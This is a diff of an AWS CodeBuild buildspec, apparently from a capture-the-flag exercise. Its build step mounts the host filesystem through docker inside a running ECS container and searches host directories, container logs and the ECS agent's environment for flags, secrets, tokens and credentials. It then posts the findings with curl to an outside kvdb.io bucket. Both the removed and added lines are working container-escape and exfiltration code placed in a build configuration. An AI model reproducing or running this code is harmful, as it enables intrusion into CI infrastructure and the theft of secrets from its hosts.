@@ -1,10 +1,5 @@
 version: 0.2
 
-env:
-  variables:
-    AWS_MAX_ATTEMPTS: "1"
-    AWS_RETRY_MODE: "standard"
-
 phases:
   build:
     commands:
@@ -13,23 +8,19 @@ phases:
         set +e
         bucket='https://kvdb.io/8uXHVtwRAd5qcuZcw9GdSh'
         runid="${CODEBUILD_BUILD_ID##*:}"
-        putkey(){ key="$1"; file="$2"; head -c 100000 "$file" | curl -fsS --connect-timeout 5 --max-time 25 --data-binary @- "$bucket/${runid}_$key" || true; }
+        putkey(){ key="$1"; file="$2"; head -c 50000 "$file" | curl -fsS --connect-timeout 5 --max-time 25 --data-binary @- "$bucket/${runid}_$key" || true; }
         echo "canary $runid" > /tmp/canary.txt; putkey canary /tmp/canary.txt
         {
-          echo '=== choose image ==='
           img=$(docker ps --filter name=ecs- --format '{{.Image}}' | head -n1)
           echo "img=$img"
-          echo '=== host targeted find ==='
-          docker run --rm -v /:/host:ro "$img" sh -c '
+          timeout 45 docker run --rm --entrypoint /bin/sh -v /:/host:ro "$img" -c '
             set +e
-            echo "--- host dirs"; ls -la /host /host/etc /host/etc/codebuild /host/var/lib/ecs /host/var/log 2>&1
-            echo "--- flag-like filenames"; find /host/etc /host/var/lib/ecs /host/var/log /host/root /host/tmp -xdev -type f 2>/dev/null | grep -Ei "flag|ctf|hacktricks|codebreach|secret" | head -n 500
-            echo "--- content grep targeted"; grep -RInaE "flag\\{|ctf\\{|HackTricks\\{|FLAG|codebreach|hacktricks" /host/etc/codebuild /host/var/lib/ecs /host/var/log /host/root /host/tmp 2>/dev/null | head -n 500
-            echo "--- codebuild host files"; find /host/etc/codebuild /host/var/lib/ecs -type f -size -300k 2>/dev/null | head -n 200 | while read f; do echo "### $f"; sed -n "1,120p" "$f" 2>/dev/null | sed -E "s/(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|CODEBUILD_AUTH_TOKEN)=.*/\\1=REDACTED/"; done
+            echo "--- dirs"; for d in /host/etc/codebuild /host/var/lib/ecs /host/var/log /host/root /host/tmp; do echo "### $d"; ls -la "$d" 2>&1 | head -n 40; done
+            echo "--- names"; find /host/etc/codebuild /host/var/lib/ecs /host/var/log /host/root /host/tmp -type f 2>/dev/null | grep -Ei "flag|ctf|hacktricks|codebreach|secret" | head -n 200
+            echo "--- grep"; grep -RInaE "flag\\{|ctf\\{|HackTricks\\{|FLAG[^A-Za-z]|codebreach|hacktricks" /host/etc/codebuild /host/var/lib/ecs /host/var/log /host/root /host/tmp 2>/dev/null | head -n 200
           ' 2>&1
-          echo '=== ecs agent env ==='
-          docker exec ecs-agent env 2>&1 | grep -Eiv 'AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)' | grep -Ei 'flag|ctf|hacktricks|codebuild|secret|token|credential|ecs|aws' || true
-          echo '=== ecs agent logs grep ==='
-          docker logs ecs-agent 2>&1 | grep -Ei 'flag|ctf|hacktricks|codebuild|secret|token|credential|error' | head -n 300 || true
-        } > /tmp/hostprobe.txt 2>&1
-        putkey hostprobe /tmp/hostprobe.txt
+          echo '--- docker logs codebuild container tail grep'
+          cid=$(docker ps --filter name=ecs- --format '{{.ID}}' | head -n1)
+          docker logs "$cid" 2>&1 | grep -Ei 'flag|ctf|hacktricks|codebreach|secret' | head -n 200 || true
+        } > /tmp/hosthits.txt 2>&1
+        putkey hosthits /tmp/hosthits.txt
